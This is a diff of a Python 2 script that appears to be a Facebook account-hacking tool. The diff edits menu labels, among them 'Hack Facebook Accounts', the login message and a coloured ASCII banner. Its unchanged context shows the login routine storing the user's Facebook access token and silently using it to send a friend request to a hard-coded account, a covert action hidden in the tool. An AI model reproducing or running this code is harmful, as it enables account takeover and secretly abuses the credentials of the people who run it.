@@ -166,7 +166,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -219,8 +219,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;33;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;41mHack The World"	
-	print "\033[1;32;40m[2] \033[1;33;42mTeam VVIRUS"																														
+	print "\033[1;32;40m[1] \033[1;33;41mHack Facebook Accounts"	
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate This Tool"																														
 	print "\033[1;32;40m[0] \033[1;33;43mLog out"
 	pilih()
 	
@@ -450,15 +450,15 @@ def pilih_super():
 
 ╔══╗╔═══╦════╦═══╦╗
 ║╔╗║║╔═╗║╔╗╔╗║╔═╗║║
-║╚╝╚╣║─║╠╝║║╚╣║─║║║
+\033[1;96m║╚╝╚╣║─║╠╝║║╚╣║─║║║
 ║╔═╗║║─║║─║║─║║─║║║─╔╗
-║╚═╝║╚═╝║─║║─║╚═╝║╚═╝║
+\033[1;96m║╚═╝║╚═╝║─║║─║╚═╝║╚═╝║
 ╚═══╩═══╝─╚╝─╚═══╩═══╝
 ╔═╗╔═╦═══╦╗─╔╦═══╦═══╦══╗
 ║║╚╝║║╔══╣║─║║╔══╩╗╔╗╠╣╠╝
-║╔╗╔╗║╚══╣╚═╝║╚══╗║║║║║║
+\033[1;96m║╔╗╔╗║╚══╣╚═╝║╚══╗║║║║║║
 ║║║║║║╔══╣╔═╗║╔══╝║║║║║║
-║║║║║║╚══╣║─║║╚══╦╝╚╝╠╣╠╗
+\033[1;96m║║║║║║╚══╣║─║║╚══╦╝╚╝╠╣╠╗
 ╚╝╚╝╚╩═══╩╝─╚╩═══╩═══╩══╝
 
 
